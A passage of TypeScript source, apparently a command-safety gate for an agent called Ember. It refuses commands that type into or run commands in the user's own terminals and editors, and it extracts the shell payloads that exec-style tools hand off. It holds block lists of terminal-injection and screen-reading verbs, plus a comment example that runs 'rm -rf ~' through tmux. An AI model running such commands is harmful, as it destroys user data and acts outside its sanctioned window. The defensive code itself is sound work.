  return [h.prog, ...words].join(" ");
}

/**
 * Tools whose verb runs the command after it in an environment (commands-closed-x9-2): the key's verb, and how many
 * words after the verb (and its options) say the environment (`nvm exec 20 x`, `rustup run stable x`).
 */
const EXEC_VERBS: Readonly<Record<string, readonly [string, number]>> = {
  stack: ["exec", 0], cabal: ["exec", 0], pyenv: ["exec", 0], rbenv: ["exec", 0], nodenv: ["exec", 0], asdf: ["exec", 0], nvm: ["exec", 1],
  fnm: ["exec", 0], volta: ["run", 0], opam: ["exec", 0], rustup: ["run", 1], goenv: ["exec", 0], jenv: ["exec", 0], plenv: ["exec", 0],
};
/** The value options of those verbs (`fnm exec --using 18`, `volta run --node 18`, `stack exec --package x`). */
const EXEC_VALUES = new Set(["--using", "--node", "--npm", "--pnpm", "--yarn", "--package", "--cwd", "--switch", "--stack-yaml", "--resolver", "--work-dir", "--project-file", "--builddir"]);
/** tmux verbs that run a shell command they are given (`tmux run-shell 'rm -rf ~'`, `tmux new-window x`). */
const TMUX_RUNS = new Set(["run-shell", "run", "if-shell", "if", "new-window", "neww", "new-session", "new", "split-window", "splitw", "respawn-pane", "respawnp", "respawn-window", "respawnw", "pipe-pane", "pipep", "display-popup", "popup"]);

/**
 * tmux's commands that type into a pane or run a command in the user's own tmux (commands-remote-r9-1), by the names
 * and the short names tmux gives them. A pane, a window, a hook, a key binding and a sourced file are all the user's
 * terminal, outside Ember's command window and outside Stop.
 */
const TMUX_DRIVES = new Set([
  "send-keys", "send", "send-prefix", "paste-buffer", "pasteb", "run-shell", "run", "if-shell", "if", "new-window", "neww", "split-window", "splitw",
  "respawn-pane", "respawnp", "respawn-window", "respawnw", "pipe-pane", "pipep", "display-popup", "popup", "display-menu", "menu", "set-hook",
  "source-file", "source", "bind-key", "bind", "command-prompt", "confirm-before", "confirm",
]);
/**
 * tmux's whole command table, each name with its short name: tmux takes any prefix of a name that fits one command
 * only (`send-k`, `run-sh`, `capture-p`), so a verb is read as tmux reads it (commands-classes-x9-1).
 */
const TMUX_COMMANDS: readonly (readonly [string, string?])[] = [
  ["attach-session", "attach"], ["bind-key", "bind"], ["break-pane", "breakp"], ["capture-pane", "capturep"], ["choose-buffer"], ["choose-client"],
  ["choose-tree"], ["choose-window"], ["choose-session"], ["clear-history", "clearhist"], ["clear-prompt-history", "clearphist"], ["clock-mode"],
  ["command-prompt"], ["confirm-before", "confirm"], ["copy-mode"], ["customize-mode"], ["delete-buffer", "deleteb"], ["detach-client", "detach"],
  ["display-menu", "menu"], ["display-message", "display"], ["display-popup", "popup"], ["display-panes", "displayp"], ["find-window", "findw"],
  ["has-session", "has"], ["if-shell", "if"], ["join-pane", "joinp"], ["kill-pane", "killp"], ["kill-server"], ["kill-session"], ["kill-window", "killw"],
  ["last-pane", "lastp"], ["last-window", "last"], ["link-window", "linkw"], ["list-buffers", "lsb"], ["list-clients", "lsc"], ["list-commands", "lscm"],
  ["list-keys", "lsk"], ["list-panes", "lsp"], ["list-sessions", "ls"], ["list-windows", "lsw"], ["load-buffer", "loadb"], ["lock-client", "lockc"],
  ["lock-server", "lock"], ["lock-session", "locks"], ["move-pane", "movep"], ["move-window", "movew"], ["new-session", "new"], ["new-window", "neww"],
  ["next-layout", "nextl"], ["next-window", "next"], ["paste-buffer", "pasteb"], ["pipe-pane", "pipep"], ["previous-layout", "prevl"],
  ["previous-window", "prev"], ["refresh-client", "refresh"], ["rename-session", "rename"], ["rename-window", "renamew"], ["resize-pane", "resizep"],
  ["resize-window", "resizew"], ["respawn-pane", "respawnp"], ["respawn-window", "respawnw"], ["rotate-window", "rotatew"], ["run-shell", "run"],
  ["save-buffer", "saveb"], ["select-layout", "selectl"], ["select-pane", "selectp"], ["select-window", "selectw"], ["send-keys", "send"],
  ["send-prefix"], ["server-access"], ["server-info", "info"], ["set-buffer", "setb"], ["set-environment", "setenv"], ["set-hook"], ["set-option", "set"],
  ["set-window-option", "setw"], ["show-buffer", "showb"], ["show-environment", "showenv"], ["show-hooks"], ["show-messages", "showmsgs"],
  ["show-options", "show"], ["show-prompt-history", "showphist"], ["show-window-options", "showw"], ["source-file", "source"], ["split-window", "splitw"],
  ["start-server", "start"], ["suspend-client", "suspendc"], ["swap-pane", "swapp"], ["swap-window", "swapw"], ["switch-client", "switchc"],
  ["unbind-key", "unbind"], ["unlink-window", "unlinkw"], ["wait-for", "wait"],
];
/**
 * The tmux commands a verb may stand for: itself when it is a command's name or short name, else every command it is
 * a prefix of. tmux refuses a prefix that fits more than one; its table differs between versions, so Ember reads such
 * a word as each command it could be, and the strictest decides.
 */
function tmuxVerbs(word: string): readonly string[] {
  if (word === "") return [];
  if (TMUX_COMMANDS.some(([name, short]) => name === word || short === word)) return [word];
  const fits = TMUX_COMMANDS.filter(([name]) => name.startsWith(word)).map(([name]) => name);
  return fits.length > 0 ? fits : [word];
}
/** tmux's commands that print what a pane shows, a paste buffer or the session's environment. */
const TMUX_READS = new Set(["capture-pane", "capturep", "show-buffer", "showb", "save-buffer", "saveb", "list-buffers", "lsb", "show-environment", "showenv", "choose-buffer"]);
/** screen's `-X` commands that type, paste or run in a session, and those that write out what it shows. */
const SCREEN_DRIVES = new Set(["stuff", "paste", "exec", "screen", "eval", "source", "process", "at", "colon", "bind", "bindkey", "register", "readreg", "readbuf"]);
const SCREEN_READS = new Set(["hardcopy", "writebuf", "copy", "log", "logfile"]);
/** The remote-control verbs of kitty (`kitty @`, `kitten @`), wezterm (`wezterm cli`), zellij and iTerm's `it2api`. */
const REMOTE_DRIVES: Readonly<Record<string, ReadonlySet<string>>> = {
  kitty: new Set(["send-text", "send-key", "launch", "run", "new-window", "kitten", "action", "env", "load-config", "remote-control"]),
  wezterm: new Set(["send-text", "spawn", "split-pane"]),
  zellij: new Set(["write", "write-chars", "new-pane", "new-tab", "edit", "run", "plugin", "pipe", "launch-or-focus-plugin", "launch-plugin", "start-or-reload-plugin"]),
  it2api: new Set(["send-text", "create-tab", "split-pane", "inject", "activate-app", "invoke-function", "sendtext"]),
};
const REMOTE_READS: Readonly<Record<string, ReadonlySet<string>>> = {
  // `ls` prints each window's environment variables and its processes' command lines (commands-classes-y9-10).
  kitty: new Set(["get-text", "ls"]),
  wezterm: new Set(["get-text"]),
  zellij: new Set(["dump-screen", "edit-scrollback"]),
  it2api: new Set(["get-buffer", "get-prompt"]),
};
/** Their options that take the next word, before the verb (`zellij -s work action …`, `kitten @ --to unix:/x …`). */
const REMOTE_VALUES = new Set(["-s", "--session", "-l", "--layout", "-c", "--config", "--config-dir", "--data-dir", "--to", "--password", "--password-file", "--password-env", "--use-password", "--class", "--pane-id", "--window-id"]);
/** An editor's options that send keys or code to one the user has open (`--remote-send`, `--remote-expr`). */
const EDITOR_SENDS = /^--remote-(send|expr)(=|$)/;
/** Desktop-bus methods of the terminal emulators that type or run in a session (Konsole, Yakuake, Guake, Tilix). */
const BUS_TYPES = /\b(sendText|runCommand|sendInput|feed_child|execute_command|runCommandInTerminal|RunCommand)\b/;

/**
 * Programs that drive a terminal or an editor of the user's own (commands-remote-r9-1): Ember never types into or
 * acts in the user's terminals, so a verb that types there or runs a command there is refused as `xdotool` is,
 * whatever the user's words say, and one that prints what a terminal shows asks as a secret. The verbs that only list
 * run and every other verb asks, by the tools' own rows (ORDINARY_VERBS, the closed default). Read by the verb's
 * place in the tool's grammar, wherever its options stand, for each command of a `\;` list.
 */
function terminalDriver(h: H): void {
  const key = h.key.replace(/^byobu-(tmux|screen)$/, "$1");
  const vals = h.args.map(a => a.v);
  const drives = (): void => h.e.refuseWith("ember.terminal", "terminal");
  const reads = (): void => h.e.add("secret", "secret.terminal", SAYS.terminalText);
  const tmux = (): void => {
    // Each command of the line: tmux ends one at a word that is `;` or ends in one.
    let verb = true;
    for (let k = 0; k < vals.length; k++) {
      const v = vals[k];
      if (v === null) continue;
      if (verb) {
        if (v.startsWith("-") && v !== "-") {
          // getopt's way (commands-classes-y9-4): the first letter that takes a value ends the cluster (`-uL sock`,
          // `-2S path`), and its value is the rest of the word or the next one. `-c` is a shell command tmux runs.
          const at = v.slice(1).search(/[LSfcT]/);
          if (at < 0) continue;
          const value = v.length > at + 2 ? v.slice(at + 2) : vals[++k];
          if (v[at + 1] === "c" && value !== undefined) {
            if (value === null) h.e.unclear("unclear.hidden-command", `Ember can't tell what ${h.prog} runs.`);
            else h.e.nested(value, "sh", h.sc, "tmux -c");
          }
          continue;
        }
        const names = tmuxVerbs(v.replace(/;$/, ""));
        if (names.some(n => TMUX_DRIVES.has(n))) drives();
        else if (names.some(n => TMUX_READS.has(n))) reads();
        verb = false;
      }
      if (v === ";" || (v.endsWith(";") && !v.endsWith("\\;"))) verb = true;
    }
  };
  const screen = (): void => {
    const at = vals.findIndex(v => v === "-X");
    const verb = at < 0 ? undefined : vals[at + 1];
    if (verb === undefined || verb === null) return;
    if (SCREEN_DRIVES.has(verb)) drives();
    else if (SCREEN_READS.has(verb)) reads();
  };
  switch (key) {
    case "tmux": tmux(); return;
    case "screen": screen(); return;
    case "byobu": tmux(); screen(); return;
    case "kitty": case "kitten": case "wezterm": case "zellij": case "it2api": {
      const tool = key === "kitten" ? "kitty" : key;
      // kitty's remote control follows `@`, wezterm's follows `cli`; zellij's and it2api's verbs stand anywhere.
      const gate = tool === "kitty" ? "@" : tool === "wezterm" ? "cli" : null;
      const from = gate === null ? 0 : vals.indexOf(gate) + 1;
      if (gate !== null && from === 0) return;
      for (let k = from; k < vals.length; k++) {
        const v = vals[k];
        if (v === null) continue;
        if (v.startsWith("-")) { if (REMOTE_VALUES.has(v)) k++; continue; }
        if (REMOTE_DRIVES[tool].has(v)) { drives(); return; }
        if (REMOTE_READS[tool].has(v)) { reads(); return; }
        // zellij's verbs stand after options whose values Ember may not know (`--max-panes 5 action write-chars`):
        // every word is read (commands-classes-y9-4).
        if (tool !== "zellij") return;
      }
      return;
    }
    case "wt": case "windowsterminal": {
      // A tab or a pane in a Windows Terminal window the user has open runs its command there (commands-classes-y9-4);
      // `-w new` and `-w -1` open a window of their own, and the focus verbs only move between tabs and panes.
      const at = vals.findIndex(v => v !== null && /^(-w|--window)$/i.test(v));
      const win = at < 0 ? undefined : vals[at + 1];
      if (win === undefined || (win !== null && /^(new|-1)$/i.test(win))) return;
      const rest = vals.filter((_v, k) => k !== at && k !== at + 1);
      const opens = rest.some(v => v !== null && /^(nt|new-tab|sp|split-pane)$/i.test(v));
      const focuses = rest.some(v => v !== null && /^(ft|focus-tab|mf|move-focus|fp|focus-pane|swap-pane|mp|move-pane)$/i.test(v));
      if (opens || !focuses) drives();
      return;
    }
    case "nvr":
      if (vals.some(v => v !== null && (EDITOR_SENDS.test(v) || /^(-c|-cc|--cmd|\+.+)$/.test(v)))) drives();
      return;
    case "vim": case "nvim": case "gvim": case "mvim": case "vi": case "view": case "gview": case "vimx":
      if (vals.some(v => v !== null && EDITOR_SENDS.test(v))) drives();
      return;
    case "emacsclient":
      if (vals.some(v => v !== null && /^(-e|--eval)(=|$)/.test(v))) drives();
      return;
    case "guake":
      if (vals.some(v => v !== null && /^(-e|--execute-command|-n|--new-tab|--split-vertical|--split-horizontal)(=|$)/.test(v))) drives();
      return;
    case "gdbus": case "dbus-send": case "busctl": case "qdbus": case "qdbus6": case "qdbus-qt5": case "qdbus-qt6":
      if (vals.some(v => v !== null && BUS_TYPES.test(v))) drives();
      return;
    case "osascript": {
      const code = vals.filter((v, k) => vals[k - 1] === "-e" && v !== null).join("\n");
      if (/\b(terminal|iterm2?|ghostty|warp|kitty|alacritty|wezterm|hyper)\b/i.test(code) && /\b(do script|doScript|write text|write contents|create (window|tab))\b/i.test(code)) drives();
      return;
    }
  }
}

/**
 * The command a tool runs for its user, read as a command of its own (commands-closed-x9-2): an exec-shaped verb's
 * payload (`stack exec -- x`, `pyenv exec x`, `rustup run stable x`), the shell text in `cargo watch -s`/`-x`,
 * `nodemon --exec`, `hyperfine`'s commands and its `--prepare`/`--setup`/`--cleanup`/`--conclude`, and `entr`'s
 * utility. Their own words naming the tool never announce what those payloads do: the payload is judged as any
 * command. One Ember can't read (tmux's shell commands, `watchexec` without `--`, a word it can't see) asks
 * (`unclear.hidden-command`), which no words announce.
 */
function toolPayload(h: H): void {
  if (h.e.readsAsMain) return;
  const args = h.args;
  const hidden = (): void => h.e.unclear("unclear.hidden-command", `Ember can't tell what ${h.prog} runs.`);
  const shellText = (a: Arg | undefined, wrapper: string): void => {
    if (!a) return;
    if (a.v === null) hidden();
    else h.e.nested(a.v, "sh", h.sc, wrapper);
  };
  // More runners of a package by its name, whose verb asks already (`deno x`, `gem exec`, `dotnet tool exec`, `dnx`):
  // the package's own line is read as npx's is, for what it is handed (commands-classes-x9-9).
  const runs = h.key === "dnx" ? 0 : h.key === "deno" && args[0]?.v === "x" ? 1 : h.key === "gem" && args[0]?.v === "exec" ? 1
    : h.key === "dotnet" && args[0]?.v === "tool" && /^(exec|run)$/.test(args[1]?.v ?? "") ? 2 : -1;
  if (runs >= 0) packageLine(h, args.slice(runs), `${h.key} ${args.slice(0, runs).map(a => a.v).join(" ")}`.trim());
  const ex = EXEC_VERBS[h.key];
  if (ex) {
    const first = firstOperand(args);
    if (first.v !== ex[0]) return;
    let k = first.at + 1;
    let env = ex[1];
    for (; k < args.length; k++) {
      const v = args[k].v;
      if (v === null) break;
      if (v === "--") { k++; break; }
      if (v.startsWith("-")) { if (EXEC_VALUES.has(v)) k++; continue; }
      if (env > 0) { env--; continue; }
      break;
    }
    const words = args.slice(k);
    if (words.some(a => a.v === null)) hidden();
    else h.e.payload(words, h.sc, `${h.key} ${ex[0]}`);
    return;
  }
  const key = unversioned(h.key);
  if (RUNS_BY_OPTION.some(([prog, opt]) => prog.test(key) && args.some(a => a.v !== null && opt.test(a.v)))) hidden();
  switch (h.key) {
    case "cargo": {
      const first = firstOperand(args);
      if (first.v !== "watch") return;
      for (let k = first.at + 1; k < args.length; k++) {
        const v = args[k].v;
        if (v === null) { hidden(); return; }
        const m = /^(-s|--shell|-x|--exec)(?:=(.*))?$/.exec(v);
        if (!m) continue;
        const text = m[2] !== undefined ? { ...args[k], v: m[2] } : args[++k];
        if (!text) return;
        if (/^-x|^--exec/.test(m[1])) { if (text.v === null) hidden(); else h.e.nested(`cargo ${text.v}`, "sh", h.sc, "cargo watch"); }
        else shellText(text, "cargo watch");
      }
      return;
    }
    case "nodemon": {
      for (let k = 0; k < args.length; k++) {
        const v = args[k].v;
        if (v === null) { hidden(); return; }
        const m = /^(-x|--exec)(?:=(.*))?$/.exec(v);
        if (m) shellText(m[2] !== undefined ? { ...args[k], v: m[2] } : args[++k], "nodemon");
      }
      return;
    }
    case "hyperfine": {
      // Every operand is a command, and so is the value of these options; other options' values are words.
      const commands = /^(-p|--prepare|-s|--setup|-c|--cleanup|-C|--conclude)$/;
      const values: Readonly<Record<string, number>> = { "-r": 1, "--runs": 1, "-w": 1, "--warmup": 1, "-m": 1, "--min-runs": 1, "-M": 1, "--max-runs": 1, "-S": 1, "--shell": 1, "-n": 1, "--command-name": 1, "-u": 1, "--time-unit": 1, "--style": 1, "--sort": 1, "--output": 1, "--input": 1, "--export-json": 1, "--export-csv": 1, "--export-markdown": 1, "--export-asciidoc": 1, "--export-orgmode": 1, "-P": 3, "--parameter-scan": 3, "-L": 2, "--parameter-list": 2, "-D": 1, "--parameter-step-size": 1 };
      for (let k = 0; k < args.length; k++) {
        const v = args[k].v;
        if (v === null) { hidden(); return; }
        if (v.startsWith("-") && v !== "-") {
          const eq = v.indexOf("=");
          const name = eq < 0 ? v : v.slice(0, eq);
          if (commands.test(name)) { shellText(eq < 0 ? args[++k] : { ...args[k], v: v.slice(eq + 1) }, "hyperfine"); continue; }
          if (eq < 0) k += values[name] ?? 0;
          continue;
        }
        shellText(args[k], "hyperfine");
      }
      return;
    }
    case "entr": {
      const at = args.findIndex(a => a.v === null || !/^-[acdnprsz]+$/.test(a.v));
      if (at < 0) return;
      const shell = args.slice(0, at).some(a => /s/.test(a.v ?? ""));
      if (shell) shellText(args[at], "entr");
      else if (args.slice(at).some(a => a.v === null)) hidden();
      else h.e.payload(args.slice(at), h.sc, "entr");
      return;
    }
    case "watchexec": {
      const dd = args.findIndex(a => a.v === "--");
      if (dd >= 0 && !args.slice(dd + 1).some(a => a.v === null)) h.e.payload(args.slice(dd + 1), h.sc, "watchexec");
      else if (args.some(a => a.v === null || !a.v.startsWith("-"))) hidden();
      return;
    }
    case "virtualenv": venvClear(h, args, "virtualenv"); return;
    // Launchers that fetch or build an environment and then run a command in it (commands-remote-r9-3): the command
    // is judged as its own; the launcher still asks as a program Ember doesn't know.
    case "mise": case "rtx": {
      const first = firstOperand(args);
      if (first.v !== "exec" && first.v !== "x") return;
      const c = args.findIndex((a, k) => k > first.at && a.v !== null && /^(-c|--command)(=|$)/.test(a.v));
      const dd = args.findIndex((a, k) => k > first.at && a.v === "--");
      if (c >= 0 && (dd < 0 || c < dd)) { const v = args[c].v ?? ""; shellText(v.includes("=") ? { ...args[c], v: v.slice(v.indexOf("=") + 1) } : args[c + 1], "mise exec"); return; }
      if (dd >= 0) h.e.payload(args.slice(dd + 1), h.sc, "mise exec");
      return;
    }
    case "nix": {
      const first = firstOperand(args);
      const rest = args.slice(first.at + 1);
      // An installable from a registry or an address is a program nix downloads; `nix run` runs it.
      if (first.v === "run" || ((first.v === "shell" || first.v === "develop") && rest.some(a => a.v === null || /^[^-].*[#:]/.test(a.v)))) h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
      if (first.v !== "shell" && first.v !== "develop" && first.v !== "run") return;
      const c = rest.findIndex(a => a.v === "-c" || a.v === "--command" || (first.v === "run" && a.v === "--"));
      if (c >= 0 && first.v !== "run") h.e.payload(rest.slice(c + 1), h.sc, `nix ${first.v}`);
      else if (c >= 0) h.e.readArgs(rest.slice(c + 1), h.sc, { unresolvedUnclear: true });
      return;
    }
    case "nix-shell": {
      if (args.some(a => a.v !== null && /^(-p|--packages)$/.test(a.v))) h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
      for (let k = 0; k < args.length; k++) if (args[k].v === "--run" || args[k].v === "--command") shellText(args[++k], "nix-shell");
      return;
    }
    case "pixi": case "devbox": {
      const first = firstOperand(args);
      if (first.v !== "run") return;
      let k = first.at + 1;
      while (k < args.length && args[k].v !== null && (args[k].v as string).startsWith("-") && args[k].v !== "--") k += /^(-e|--environment|--manifest-path|-c|--config|--env|--env-file)$/.test(args[k].v as string) ? 2 : 1;
      if (args[k]?.v === "--") k++;
      if (k < args.length) h.e.payload(args.slice(k), h.sc, `${h.key} run`);
      return;
    }
    case "direnv": {
      const first = firstOperand(args);
      if (first.v === "exec" && args.length > first.at + 2) h.e.payload(args.slice(first.at + 2), h.sc, "direnv exec");
      return;
    }
    case "fd": case "fdfind": {
      // The command fd runs for each file it finds (`-x`), or once for all of them (`-X`), up to a lone `;`.
      const at = args.findIndex(a => a.v !== null && /^(-x|--exec|-X|--exec-batch)$/.test(a.v));
      if (at < 0) return;
      const end = args.findIndex((a, k) => k > at && a.v === ";");
      const words = args.slice(at + 1, end < 0 ? args.length : end);
      if (words.some(a => a.v === null)) hidden();
      else h.e.payload(words, h.sc, `${h.key} -x`);
      return;
    }
    case "bat": case "batcat": {
      // The pager is a command line bat hands to the shell.
      for (let k = 0; k < args.length; k++) {
        const m = /^--pager(?:=(.*))?$/.exec(args[k].v ?? "");
        if (m) shellText(m[1] !== undefined ? { ...args[k], v: m[1] } : args[++k], h.key);
      }
      return;
    }
    case "deno": {
      // Not a payload: `deno compile -o` writes an executable, which outside the task's folder (`-o ~/bin/x`) is a
      // program later commands find by name (commands-closed-x9-5).
      const first = firstOperand(args);
      if (first.v !== "compile") return;
      for (let k = first.at + 1; k < args.length; k++) {
        const v = args[k].v;
        const m = v === null ? null : /^(-o|--output)(?:=(.*))?$/.exec(v);
        if (!m) continue;
        const out = m[2] !== undefined ? m[2] : args[k + 1]?.v ?? null;
        if (out === null || !ownFolder(out, h.sc, h.e.ctx.cwd || null)) h.e.add("unknown", "unknown.verb", unknownVerbSays(h.prog, "compile -o"), { program: "deno compile -o" });
        return;
      }
      return;
    }
    case "tmux": {
      const first = firstOperand(args);
      if (first.v !== null && tmuxVerbs(first.v).some(n => TMUX_RUNS.has(n)) && args.slice(first.at + 1).some(a => a.v === null || !a.v.startsWith("-"))) hidden();
      // A format's `#(…)` is a shell command tmux runs (`tmux display-message -p '#(…)'`: commands-closed-y9-4).
      else if (args.some(a => a.v !== null && a.v.includes("#("))) hidden();
      return;
    }
    case "cmake": {
      // `cmake -P` runs a script: one from outside the task's folder isn't the project's (commands-closed-y9-4).
      const at = args.findIndex(a => a.v === "-P");
      const script = at < 0 ? undefined : args[at + 1]?.v;
      if (at >= 0 && (!script || !ownFolder(script, h.sc, h.e.ctx.cwd || null))) hidden();
      return;
    }
  }
}

/**
 * Options of everyday programs that run a command they are given (commands-closed-y9-4): a GNU compiler's `-wrapper`,
 * ctest's `--build-and-test … --test-command` and `-S` scripts, prove's `--exec`. By the program's key, its version
 * suffix dropped.
 */
const RUNS_BY_OPTION: readonly (readonly [RegExp, RegExp])[] = [
  [/^(.+-)?(gcc|g\+\+|cc|c\+\+|cpp|gfortran|gccgo|gdc|gnat)$/, /^-wrapper$/],
  [/^ctest$/, /^(--build-and-test|--test-command|-S|-SP|--script|--script-new-process)(=|$)/],
  // prove's -e in a bundle too (`-ve`); a compiler's plug-in is code it loads (commands-remote-r9-2, commands-closed-4).
  [/^prove$/, /^(-[A-Za-z]*e|--exec)(=|$)/],
  [/^(.+-)?(gcc|g\+\+|cc|c\+\+|cpp|gfortran|clang|clang\+\+|clang-cl)$/, /^(-fplugin=|-fpass-plugin=|-load$)/],
  [/^pandoc$/, /^(-F|--filter|-L|--lua-filter)(=|.|$)/],
  [/^protoc$/, /^--plugin(=|$)/],
  [/^just$/, /^(--shell|--shell-arg|--command|-c)(=|$)/],
];

/**
 * The card's line for a tool's command Ember doesn't know, naming it (commands-closed-x9-8): "It runs cargo watch, a
 * command of cargo that Ember doesn't know.", or for a tool that acts with no command, "It runs vercel with no
 * command, and Ember doesn't know what that does."
 */
function unknownVerbSays(tool: string, verb: string): string {
  return verb === "" ? `It runs ${tool} with no command, and Ember doesn't know what that does.` : `It runs ${tool} ${verb}, a command of ${tool} that Ember doesn't know.`;
}

/** TeX engines, whose shell escape (off by default) runs the commands a document names. */
const TEX_ENGINES = new Set(["latex", "pdflatex", "xelatex", "lualatex", "tex", "pdftex", "xetex", "luatex", "latexmk"]);

/**
 * A verb-keyed tool's verb against the ones Ember knows (ORDINARY_VERBS, commands-closed): the verb is the first word
 * that isn't an option or an option's value (by the tool's global grammar where it has one). One off the list, a
 * sub-verb off its list, an option that makes a known verb change a setting, or (`noRow`: a tool with no row) no verb
 * at all asks (`unknown.verb`), named with the verb for the user's words to match ("cabal exec", "stack exec").
 */
function toolVerbs(h: H, tool: OrdinaryVerbs, noRow: boolean): void {
  const args = h.args;
  const say = (verb: string): void => { h.e.add("unknown", "unknown.verb", unknownVerbSays(h.prog, verb), { program: `${h.prog} ${verb}`.trim() }); };
  const vals = new Set(tool.values ?? []);
  const operand = (start: number): number => {
    for (let k = start; k < args.length; k++) {
      const v = args[k].v;
      if (v === null) return k;
      if (v === "--") return k + 1 < args.length ? k + 1 : -1;
      if (v.startsWith("-") && v !== "-" && !tool.verbs.includes(v)) { if (vals.has(v)) k++; continue; }
      return k;
    }
    return -1;
  };
  let at: number;
  if (GLOBAL_OPTIONS[h.key]) {
    const g = globals(h, h.key);
    if (g.unknown) return;
    at = g.verbAt < args.length ? g.verbAt : -1;
  } else at = operand(0);
  const always = tool.asks?.[""] ?? [];
  const bad = args.find(a => a.v !== null && always.includes(a.v.split("=")[0]));
  if (bad) { say(bad.v ?? ""); return; }
  if (at < 0) { if (noRow || tool.bare === "asks") say(""); return; }
  // A file is the project's own, never an address (`deno https://x/y.ts`, `npm:`, `jsr:`: commands-closed-y9-4).
  const known = (w: string): boolean => tool.verbs.includes(w) || ((tool.files?.test(w) ?? false) && !/^[a-z][a-z0-9+.-]+:/i.test(w));
  const words: Arg[] = [args[at]];
  for (let k = at + 1; tool.all && k < args.length; k++) {
    const v = args[k].v;
    if (v !== null && v.startsWith("-")) { if (vals.has(v)) k++; continue; }
    words.push(args[k]);
  }
  for (const a of words) {
    if (a.v === null) { say(a.raw); return; }
    const parts = tool.all ? a.v.split(";").map(p => p.trim().split(/\s+/)[0]).filter(p => p !== "") : [a.v];
    for (const p of parts) if (!known(p)) { say(p); return; }
  }
  const verb = args[at].v ?? "";
  const sub = tool.sub?.[verb];
  if (sub) {
    const k = operand(at + 1);
    const w = k < 0 ? null : args[k];
    if (w && (w.v === null || !sub.includes(w.v))) { say(`${verb} ${w.v ?? w.raw}`); return; }
  }
  const asks = tool.asks?.[verb] ?? [];
  const opt = args.slice(at + 1).find(a => a.v !== null && asks.includes(a.v.split("=")[0]));
  if (opt) say(`${verb} ${opt.v}`);
}

/** A program word's key as the allow-list knows it: a version suffix dropped (`python3.12`, `gcc-13`, `clang-17`). */
const unversioned = (key: string): string => key.replace(/(?<=[a-z+])-?\d+(\.\d+)*$/, "");

/** Whether Ember knows a program with no row: on the allow-list, or in one of the tables generic() reads. */
function knownProgram(key: string): boolean {
  for (const k of [key, unversioned(key)]) {
    if (ORDINARY_PROGRAMS.has(k) || KNOWN_ORDINARY.has(k) || TEXT.has(k) || LISTS_ONLY.has(k)) return true;
    if (INPUT_SYNTH.has(k) || GUI_PROGRAMS.has(k) || INTERACTIVE.has(k) || LAUNCHERS.has(k) || SECRET_PROGRAMS.has(k)) return true;
    if (CLIPBOARD_READERS.has(k) || SCREENSHOTTERS.has(k) || RECORDERS.has(k) || DISK_TOOLS.has(k) || /^mkfs(\.|$)/.test(k)) return true;
  }
  return false;
}

/**
 * Whether a program's path is in the task's own folder (`start`): relative and staying in it, or absolute (or from ~)
 * and under it, never through a hidden folder of its own (`.git/hooks/x`, `.cache/x`) but a package manager's `.bin`
 * and a virtual environment's `.venv/bin`.
 * With no folder known, a relative path that doesn't climb out (`..`) is.
 */
function ownFolder(word: string, sc: Scope, start: string | null): boolean {
  const env = sc.path;
  const sep = env.flavour === "posix" ? /\// : /[\\/]/;
  const relative = !word.startsWith("~") && !isAbsolute(word, env.flavour);
  if (!sc.cwd) return relative && !word.split(sep).includes("..");
  // The task's folder, not the one a `cd` on the line moved to (`cd /usr/bin && ./dropdb`: commands-closed-x9-3). A
  // line that moved from a folder Ember doesn't know has none.
  if (!start || (sc.cwd !== start && !isUnder(sc.cwd, start, env))) return false;
  if (word.startsWith("~") && !sc.home) return false;
  const abs = resolveTargetPath(word, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd });
  if (!isUnder(abs, start, env) || abs === start) return false;
  // A program found in a folder on the usual PATH is known by its name, even when the task's folder holds that folder.
  const dir = abs.slice(0, Math.max(abs.search(env.flavour === "posix" ? /\/[^/]*$/ : /[\\/][^\\/]*$/), 0));
  if (pathFolders(sc).some(f => isUnder(dir, f, env) && isUnder(f, dir, env))) return false;
  const rest = abs.slice(start.length).split(sep).filter(Boolean);
  // The project's virtual environment's programs (`.venv/bin/pytest`) are its tooling too (commands-closed-x9-7).
  return !rest.slice(0, -1).some((seg, k) => seg.startsWith(".") && seg !== ".bin" && !(seg === ".venv" && /^(bin|Scripts)$/.test(rest[k + 1] ?? "") && k + 2 === rest.length - 1));
}

/** The folders a target's PATH usually holds (commands-closed-x9-3): a program there is the system's or the user's, not the project's. */
function pathFolders(sc: Scope): string[] {
  const home = sc.home;
  if (sc.path.flavour === "win32") {
    return ["C:\\Windows", "C:\\Windows\\System32", "C:\\Windows\\SysWOW64", ...(home ? [`${home}\\bin`, `${home}\\.local\\bin`, `${home}\\scoop\\shims`, `${home}\\.cargo\\bin`, `${home}\\go\\bin`] : [])];
  }
  return ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin", "/opt/homebrew/bin", "/opt/homebrew/sbin", "/snap/bin",
    ...(home ? [`${home}/bin`, `${home}/.local/bin`, `${home}/.cargo/bin`, `${home}/go/bin`, `${home}/.npm-global/bin`, `${home}/.deno/bin`, `${home}/.bun/bin`] : [])];
}

/** Programs Ember has no row for that only list or measure what a folder holds (`eza -la ~`, `fd foo ~`, `dust ~`). */
const LISTS_ONLY = new Set(["eza", "exa", "lsd", "fd", "fdfind", "dust", "duf", "gdu", "erdtree", "erd"]);

/** A long option naming an install prefix, whose value may be written apart (`./configure --prefix ~/.local`). */
const PREFIX_OPTION = /^--([a-z]+-)*prefix$/i;

/**
 * An operand of a program Ember has no row for that is the home folder or holds it, or one that holds Ember's own files
 * (`rimraf ~` before it had a row, `rmlint ~`, `stow -t ~ dotfiles`, `mytool ..` from a folder in the home folder):
 * Ember can't tell what the program does to all that is there, so it asks (commands-remote-c8-2). Other folders run as
 * before, and so do install prefixes, attached or apart (`./configure --prefix ~/.local`). A folder above the command's
 * folder no longer asks for that alone: after `cd build` it is the project itself (`qmake ..`: commands-remote-x8-7),
 * and Ember can't tell where a project starts.
 */
function broadOperand(h: H): void {
  if (LISTS_ONLY.has(h.key)) return;
  const sc = h.sc;
  const env = sc.path;
  for (let k = 0; k < h.args.length; k++) {
    const a = h.args[k];
    if (a.param !== undefined || a.v === null || a.v === "" || a.glob || isOption(a) || URL_LIKE.test(a.v)) continue;
    if (k > 0 && PREFIX_OPTION.test(h.args[k - 1].v ?? "")) continue;
    if (a.v.startsWith("~") ? !sc.home : !isAbsolute(a.v, env.flavour) && !sc.cwd) continue;
    const abs = resolveTargetPath(a.v, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
